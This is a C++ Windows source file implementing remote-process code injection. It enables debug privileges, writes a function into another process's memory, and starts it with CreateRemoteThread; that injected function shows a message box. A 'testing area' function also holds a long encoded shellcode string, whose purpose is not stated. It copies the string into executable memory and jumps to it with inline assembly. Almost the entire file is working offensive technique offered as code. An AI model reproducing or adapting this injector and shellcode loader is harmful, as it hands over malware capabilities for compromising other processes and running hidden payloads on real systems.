#include<Windows.h>
#include<iostream>
#include<TlHelp32.h>
#include<stdlib.h>
#include "mprocess.h"

using namespace std;
typedef int (WINAPI* msgparam)(HWND,LPSTR,LPSTR,UINT);
int privileges();
struct PARAMETERS
{
    DWORD MessageBoxinj;
    char szText[50];
    char szCaption[50];
    int  szButtons;
};
static DWORD MyFunc(PARAMETERS* Message);
static DWORD mytest(LPVOID params);
static DWORD exec_payload(LPVOID lpParameter);
static DWORD Stub();


struct DATA
{
	DWORD mdword;
	int i;
	char* mchar;
	std::string mstring;
	bool mbool;
};


int main()
{
    if(privileges() ==0)
    {

        DWORD pid = (DWORD)find_win32_proc();
        if(pid == 0) return 1;

        HANDLE p = OpenProcess(PROCESS_ALL_ACCESS,false,pid);
        if(p == 0) return 1;

        PARAMETERS szInjectionData;
        szInjectionData.MessageBoxinj = (DWORD)GetProcAddress(LoadLibrary(L"User32.dll"),"MessageBoxA");
        szInjectionData.szButtons = MB_ICONERROR|MB_OK;
		char star[30];
		strcpy(star,get_proc_name((int)pid).c_str());
        strcpy_s(szInjectionData.szCaption,star);
        strcpy_s(szInjectionData.szText,"Called from Code Injection");

        DWORD szFunctionSize = (DWORD) Stub - (DWORD)MyFunc;
        LPVOID szFunctionAddress = VirtualAllocEx(p,0,szFunctionSize,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(p,szFunctionAddress,(VOID*)MyFunc,szFunctionSize,0);
        LPVOID szDataAdress = VirtualAllocEx(p,0,sizeof(PARAMETERS),MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
        WriteProcessMemory(p,szDataAdress,&szInjectionData,sizeof(PARAMETERS),0);

        HANDLE Thread = CreateRemoteThread(p,0,0,(LPTHREAD_START_ROUTINE)szFunctionAddress,szDataAdress,0,0);
        std::cout<<"Thread: "<<Thread<<"\n";
        if (Thread == NULL) {
            std::cout<<"ERROR: "<<GetLastError()<<"\n";
        }

        if(Thread !=0)
        {
            WaitForSingleObject(Thread, INFINITE);
            VirtualFree(szFunctionAddress, 0, MEM_RELEASE); //free myFunc memory
            VirtualFree(szDataAdress, 0, MEM_RELEASE); //free data memory
            CloseHandle(Thread);
            CloseHandle(p);  //don't wait for the thread to finish, just close the handle to the process
            cout<<"Injection completed!"<<endl;
            return 0;
        }
    }
    else
    {
        std::cout<<"PRIVS\n";
        exit(1);
    }
}

static DWORD MyFunc(PARAMETERS * myparam) {
    msgparam MsgBox = (msgparam)myparam->MessageBoxinj;
    MsgBox(0, myparam->szText, myparam->szCaption, myparam->szButtons);
    return 0;
}

static DWORD Stub() {
    return 0;
}

int privileges() {
    HANDLE Token;
    TOKEN_PRIVILEGES tp;
    if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&Token))
    {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (AdjustTokenPrivileges(Token, 0, &tp, sizeof(tp), NULL, NULL)==0) {
            std::cout<<"TOKENS FAILED\n";
            return 1; //FAIL
        } else {
            return 0; //SUCCESS
        }
    }
    return 1;
}

/* ---------- MY OWN TESTING AREA ---------- */

static DWORD exec_payload(LPVOID lpParameter)
{
	char pay[]="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI9lzHk6c0307pE0MYKUdqKb3TlKQBP0LKqBvlLKSbftlKQbgX4OLwPJWV5akOTqO0nLgLsQalDB6LgPIQjoTMGqO78bL062cgLKPR6pLKg2ulNkblr0rXJCQZWq8QbqLKaIup31XSnkcyvxIs5lG9nkUdNkEQzv6QyovQ9PnL9Q8ODMgqiWVXKP45kDgsQmIhEkcMwTD5irShLKcha4VakcRFnkDLRknkRxuL7qICnkTDNkEQJpMYG4DdutskSk0a69qJRqIo9pF8SoPZlKgbJKMYcmcXVSDrePuPsXd73C4r1OcdCXRl1gUvfgioKemhz06a7puPWYxDQDBpaxeyK0PkC0yoZubpbprpF0cpRpsp2paxizTO9Oip9o8UOgbJveaxeZEPWpMF1x7rs0FqaLlIiv1zTPf6RwBHlYNEadu1yoZuLEYP1d6lioPNC8qezL2HxpX5LbqFioHUbJwpbJFdaFRw2HfbHYjhsoIon5lKFV3Z70u8C0vpuPUPqFQzwpSXchY4RszEKOHULSrs3ZGpV60SpWU8grXYzhcoiojuFahCvIHFk5IfsEzLISAA";
	size_t len = (size_t)strlen(pay);
	char* code = (char*)VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // copy over the shellcode
    strncpy(code, pay, len);

    // execute it by ASM code

    __try
    {
        __asm
        {
            mov eax, [code]
            call eax
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
    }

    return 0;
}